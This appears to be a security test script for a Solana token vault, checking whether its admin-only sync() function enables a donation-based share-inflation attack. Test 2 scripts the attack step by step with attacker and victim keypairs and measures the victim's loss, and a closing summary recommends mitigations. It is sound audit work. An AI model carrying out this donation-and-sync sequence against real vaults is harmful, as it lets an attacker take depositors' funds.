/**
 * SVS-1 Sync Function Test Suite
 *
 * Tests the sync() function and its potential for abuse:
 * 1. Basic sync functionality
 * 2. Sync after donation (inflation attack with sync)
 * 3. Sync timing attack (sync between donation and victim deposit)
 * 4. Unauthorized sync attempts
 * 5. Sync with legitimate yield
 *
 * Run: npx ts-node scripts/svs-1/sync.ts
 */

import * as anchor from "@coral-xyz/anchor";
import { BN } from "@coral-xyz/anchor";
import {
  createMint,
  getOrCreateAssociatedTokenAccount,
  mintTo,
  transfer,
  TOKEN_PROGRAM_ID,
  TOKEN_2022_PROGRAM_ID,
  getAccount,
  getAssociatedTokenAddressSync,
  ASSOCIATED_TOKEN_PROGRAM_ID,
  getMint,
} from "@solana/spl-token";
import { Keypair, SystemProgram, SYSVAR_RENT_PUBKEY } from "@solana/web3.js";
import { setupTest, getVaultPDA, getSharesMintPDA, fundAccounts, ASSET_DECIMALS, SHARE_DECIMALS } from "./helpers";

async function main() {
  const { connection, payer, program, programId } = await setupTest("Sync Function Analysis");

  console.log("\n" + "=".repeat(70));
  console.log("  TEST 1: Basic Sync Functionality");
  console.log("=".repeat(70));

  // Setup vault
  const assetMint = await createMint(
    connection, payer, payer.publicKey, null, ASSET_DECIMALS,
    Keypair.generate(), undefined, TOKEN_PROGRAM_ID
  );

  const userAta = await getOrCreateAssociatedTokenAccount(
    connection, payer, assetMint, payer.publicKey, false, undefined, undefined, TOKEN_PROGRAM_ID
  );

  await mintTo(connection, payer, assetMint, userAta.address, payer, 10_000_000 * 10 ** ASSET_DECIMALS);

  const vaultId = new BN(Date.now());
  const [vault] = getVaultPDA(programId, assetMint, vaultId);
  const [sharesMint] = getSharesMintPDA(programId, vault);
  const assetVault = anchor.utils.token.associatedAddress({ mint: assetMint, owner: vault });
  const userSharesAccount = getAssociatedTokenAddressSync(
    sharesMint, payer.publicKey, false, TOKEN_2022_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID
  );

  await program.methods
    .initialize(vaultId, "Sync Test Vault", "SYNC", "https://test.com")
    .accountsStrict({
      authority: payer.publicKey, vault, assetMint, sharesMint, assetVault,
      assetTokenProgram: TOKEN_PROGRAM_ID, token2022Program: TOKEN_2022_PROGRAM_ID,
      associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID,
      systemProgram: SystemProgram.programId, rent: SYSVAR_RENT_PUBKEY,
    })
    .rpc();

  // Initial deposit
  await program.methods
    .deposit(new BN(10_000 * 10 ** ASSET_DECIMALS), new BN(0))
    .accountsStrict({
      user: payer.publicKey, vault, assetMint, userAssetAccount: userAta.address,
      assetVault, sharesMint, userSharesAccount,
      assetTokenProgram: TOKEN_PROGRAM_ID, token2022Program: TOKEN_2022_PROGRAM_ID,
      associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID, systemProgram: SystemProgram.programId,
    })
    .rpc();

  let vaultState = await program.account.vault.fetch(vault);
  let vaultBalance = await getAccount(connection, assetVault);

  console.log("\n  After initial deposit:");
  console.log(`    total_assets (accounting): ${vaultState.totalAssets.toNumber() / 10 ** ASSET_DECIMALS}`);
  console.log(`    actual balance:            ${Number(vaultBalance.amount) / 10 ** ASSET_DECIMALS}`);
  console.log(`    match: ${vaultState.totalAssets.toNumber() === Number(vaultBalance.amount) ? "✅" : "❌"}`);

  // Direct transfer (simulating yield or donation)
  console.log("\n  Simulating external yield: +5000 tokens directly to vault...");
  await transfer(
    connection, payer, userAta.address, assetVault, payer,
    5000 * 10 ** ASSET_DECIMALS, [], undefined, TOKEN_PROGRAM_ID
  );

  vaultState = await program.account.vault.fetch(vault);
  vaultBalance = await getAccount(connection, assetVault);

  console.log("\n  After external transfer (before sync):");
  console.log(`    total_assets (accounting): ${vaultState.totalAssets.toNumber() / 10 ** ASSET_DECIMALS}`);
  console.log(`    actual balance:            ${Number(vaultBalance.amount) / 10 ** ASSET_DECIMALS}`);
  console.log(`    discrepancy:               ${(Number(vaultBalance.amount) - vaultState.totalAssets.toNumber()) / 10 ** ASSET_DECIMALS}`);

  // Call sync
  console.log("\n  Calling sync()...");
  await program.methods
    .sync()
    .accountsStrict({
      authority: payer.publicKey,
      vault,
      assetVault,
    })
    .rpc();

  vaultState = await program.account.vault.fetch(vault);

  console.log("\n  After sync:");
  console.log(`    total_assets (accounting): ${vaultState.totalAssets.toNumber() / 10 ** ASSET_DECIMALS}`);
  console.log(`    actual balance:            ${Number(vaultBalance.amount) / 10 ** ASSET_DECIMALS}`);
  console.log(`    match: ${vaultState.totalAssets.toNumber() === Number(vaultBalance.amount) ? "✅" : "❌"}`);

  // ============================================================================
  // TEST 2: Sync Timing Attack (THE CRITICAL ONE)
  // ============================================================================
  console.log("\n" + "=".repeat(70));
  console.log("  TEST 2: Sync Timing Attack (Donation + Sync Before Victim)");
  console.log("=".repeat(70));

  // Create fresh vault for this test
  const attacker = Keypair.generate();
  const victim = Keypair.generate();

  await fundAccounts(connection, payer, [attacker.publicKey, victim.publicKey], 0.05);

  const attackerAta = await getOrCreateAssociatedTokenAccount(
    connection, payer, assetMint, attacker.publicKey, false, undefined, undefined, TOKEN_PROGRAM_ID
  );
  const victimAta = await getOrCreateAssociatedTokenAccount(
    connection, payer, assetMint, victim.publicKey, false, undefined, undefined, TOKEN_PROGRAM_ID
  );

  // Give attacker lots of tokens, victim modest amount
  const ATTACKER_DEPOSIT = 1;
  const ATTACKER_DONATION = 1_000_000;
  const VICTIM_DEPOSIT = 1_000;

  await mintTo(connection, payer, assetMint, attackerAta.address, payer,
    (ATTACKER_DEPOSIT + ATTACKER_DONATION) * 10 ** ASSET_DECIMALS);
  await mintTo(connection, payer, assetMint, victimAta.address, payer,
    VICTIM_DEPOSIT * 10 ** ASSET_DECIMALS);

  // New vault
  const vaultId2 = new BN(Date.now() + 1);
  const [vault2] = getVaultPDA(programId, assetMint, vaultId2);
  const [sharesMint2] = getSharesMintPDA(programId, vault2);
  const assetVault2 = anchor.utils.token.associatedAddress({ mint: assetMint, owner: vault2 });

  await program.methods
    .initialize(vaultId2, "Attack Test Vault", "ATTACK", "https://test.com")
    .accountsStrict({
      authority: payer.publicKey, vault: vault2, assetMint, sharesMint: sharesMint2, assetVault: assetVault2,
      assetTokenProgram: TOKEN_PROGRAM_ID, token2022Program: TOKEN_2022_PROGRAM_ID,
      associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID,
      systemProgram: SystemProgram.programId, rent: SYSVAR_RENT_PUBKEY,
    })
    .rpc();

  const attackerSharesAccount = getAssociatedTokenAddressSync(
    sharesMint2, attacker.publicKey, false, TOKEN_2022_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID
  );
  const victimSharesAccount = getAssociatedTokenAddressSync(
    sharesMint2, victim.publicKey, false, TOKEN_2022_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID
  );

  console.log("\n  Step 1: Attacker deposits 1 token");
  await program.methods
    .deposit(new BN(ATTACKER_DEPOSIT * 10 ** ASSET_DECIMALS), new BN(0))
    .accountsStrict({
      user: attacker.publicKey, vault: vault2, assetMint,
      userAssetAccount: attackerAta.address, assetVault: assetVault2, sharesMint: sharesMint2,
      userSharesAccount: attackerSharesAccount,
      assetTokenProgram: TOKEN_PROGRAM_ID, token2022Program: TOKEN_2022_PROGRAM_ID,
      associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID, systemProgram: SystemProgram.programId,
    })
    .signers([attacker])
    .rpc();

  let attackerShares = await getAccount(connection, attackerSharesAccount, undefined, TOKEN_2022_PROGRAM_ID);
  console.log(`    Attacker shares: ${Number(attackerShares.amount) / 10 ** SHARE_DECIMALS}`);

  console.log("\n  Step 2: Attacker donates 1M tokens directly to vault");
  await transfer(
    connection, attacker, attackerAta.address, assetVault2, attacker,
    ATTACKER_DONATION * 10 ** ASSET_DECIMALS, [], undefined, TOKEN_PROGRAM_ID
  );

  let vault2State = await program.account.vault.fetch(vault2);
  let vault2Balance = await getAccount(connection, assetVault2);

  console.log(`    Vault total_assets: ${vault2State.totalAssets.toNumber() / 10 ** ASSET_DECIMALS}`);
  console.log(`    Vault actual balance: ${Number(vault2Balance.amount) / 10 ** ASSET_DECIMALS}`);

  console.log("\n  Step 3: ⚠️  Authority calls sync() (THIS IS THE ATTACK ENABLER)");
  await program.methods
    .sync()
    .accountsStrict({
      authority: payer.publicKey,
      vault: vault2,
      assetVault: assetVault2,
    })
    .rpc();

  vault2State = await program.account.vault.fetch(vault2);
  console.log(`    Vault total_assets AFTER sync: ${vault2State.totalAssets.toNumber() / 10 ** ASSET_DECIMALS}`);

  const sharesMintInfo = await getMint(connection, sharesMint2, undefined, TOKEN_2022_PROGRAM_ID);
  const totalSharesBefore = Number(sharesMintInfo.supply);
  console.log(`    Total shares supply: ${totalSharesBefore / 10 ** SHARE_DECIMALS}`);

  // Calculate what victim SHOULD get vs what they'll actually get
  const expectedSharesNaive = VICTIM_DEPOSIT; // 1:1 in a fair world
  const actualSharesCalc = (VICTIM_DEPOSIT * 10 ** ASSET_DECIMALS) * totalSharesBefore / vault2State.totalAssets.toNumber();
  console.log(`\n    If victim deposits ${VICTIM_DEPOSIT} tokens now:`);
  console.log(`      Expected (fair):  ~${expectedSharesNaive} shares`);
  console.log(`      Actual calc:      ~${(actualSharesCalc / 10 ** SHARE_DECIMALS).toFixed(6)} shares`);

  console.log("\n  Step 4: Victim deposits 1000 tokens");

  try {
    await program.methods
      .deposit(new BN(VICTIM_DEPOSIT * 10 ** ASSET_DECIMALS), new BN(0))
      .accountsStrict({
        user: victim.publicKey, vault: vault2, assetMint,
        userAssetAccount: victimAta.address, assetVault: assetVault2, sharesMint: sharesMint2,
        userSharesAccount: victimSharesAccount,
        assetTokenProgram: TOKEN_PROGRAM_ID, token2022Program: TOKEN_2022_PROGRAM_ID,
        associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID, systemProgram: SystemProgram.programId,
      })
      .signers([victim])
      .rpc();

    const victimShares = await getAccount(connection, victimSharesAccount, undefined, TOKEN_2022_PROGRAM_ID);
    const victimSharesNum = Number(victimShares.amount) / 10 ** SHARE_DECIMALS;

    console.log(`    Victim received: ${victimSharesNum} shares`);

    if (victimSharesNum < 1) {
      console.log("\n  ❌ EXPLOIT CONFIRMED: Victim received < 1 share for 1000 tokens!");
      console.log("     The sync() after donation attack works.");
    } else if (victimSharesNum < VICTIM_DEPOSIT * 0.5) {
      console.log("\n  ⚠️  PARTIAL EXPLOIT: Victim received significantly fewer shares than expected");
    } else {
      console.log("\n  ✅ Protected: Victim received reasonable shares");
    }

    // What is attacker's share worth now?
    attackerShares = await getAccount(connection, attackerSharesAccount, undefined, TOKEN_2022_PROGRAM_ID);
    vault2State = await program.account.vault.fetch(vault2);
    const newTotalShares = await getMint(connection, sharesMint2, undefined, TOKEN_2022_PROGRAM_ID);

    const attackerShareValue = (Number(attackerShares.amount) * vault2State.totalAssets.toNumber()) / Number(newTotalShares.supply);

    console.log("\n  Attacker's position:");
    console.log(`    Shares: ${Number(attackerShares.amount) / 10 ** SHARE_DECIMALS}`);
    console.log(`    Share value: ~${(attackerShareValue / 10 ** ASSET_DECIMALS).toFixed(2)} tokens`);
    console.log(`    Original investment: ${ATTACKER_DEPOSIT + ATTACKER_DONATION} tokens`);

    // Test victim redemption
    console.log("\n  Step 5: Victim tries to redeem");
    const victimAssetsBefore = await getAccount(connection, victimAta.address);

    await program.methods
      .redeem(new BN(Number(victimShares.amount)), new BN(0))
      .accountsStrict({
        user: victim.publicKey, vault: vault2, assetMint,
        userAssetAccount: victimAta.address, assetVault: assetVault2, sharesMint: sharesMint2,
        userSharesAccount: victimSharesAccount,
        assetTokenProgram: TOKEN_PROGRAM_ID, token2022Program: TOKEN_2022_PROGRAM_ID,
      })
      .signers([victim])
      .rpc();

    const victimAssetsAfter = await getAccount(connection, victimAta.address);
    const victimRedeemed = (Number(victimAssetsAfter.amount) - Number(victimAssetsBefore.amount)) / 10 ** ASSET_DECIMALS;

    console.log(`    Victim redeemed: ${victimRedeemed.toFixed(2)} tokens`);
    console.log(`    Victim loss: ${(VICTIM_DEPOSIT - victimRedeemed).toFixed(2)} tokens (${((1 - victimRedeemed/VICTIM_DEPOSIT) * 100).toFixed(2)}%)`);

  } catch (err: any) {
    console.log(`    Transaction failed: ${err.message}`);
    if (err.message.includes("0 shares") || err.message.includes("zero")) {
      console.log("\n  ❌ CRITICAL: Victim can't even deposit - would receive 0 shares!");
    }
  }

  // ============================================================================
  // TEST 3: Unauthorized Sync
  // ============================================================================
  console.log("\n" + "=".repeat(70));
  console.log("  TEST 3: Unauthorized Sync Attempt");
  console.log("=".repeat(70));

  const unauthorized = Keypair.generate();
  await fundAccounts(connection, payer, [unauthorized.publicKey], 0.02);

  try {
    await program.methods
      .sync()
      .accountsStrict({
        authority: unauthorized.publicKey,
        vault: vault2,
        assetVault: assetVault2,
      })
      .signers([unauthorized])
      .rpc();
    console.log("\n  ❌ FAILED: Unauthorized user was able to call sync!");
  } catch (err: any) {
    console.log("\n  ✅ PASSED: Unauthorized sync correctly rejected");
  }

  // ============================================================================
  // SUMMARY
  // ============================================================================
  console.log("\n" + "=".repeat(70));
  console.log("  SUMMARY: Sync Function Security Analysis");
  console.log("=".repeat(70));

  console.log(`
  Key Findings:

  1. sync() is admin-only: ✅ (good - prevents random attackers)

  2. Donation without sync: ✅ Protected
     - Donated tokens don't affect share price until sync is called
     - Victims get fair shares based on tracked deposits

  3. Donation WITH sync: ⚠️  POTENTIAL EXPLOIT
     - If authority (or malicious insider) calls sync after donation
     - Share price inflates dramatically
     - New depositors get almost no shares
     - Attacker captures most of the vault value

  Recommendations:

  1. Consider adding a timelock to sync()
  2. Consider limiting sync() to only INCREASE total_assets (not decrease)
  3. Consider adding minimum share output checks in deposit
  4. Document that sync() should only be called for legitimate yield
  5. Consider emitting events when sync changes total_assets significantly
  `);

  console.log("=".repeat(70) + "\n");
}

main().catch(console.error);
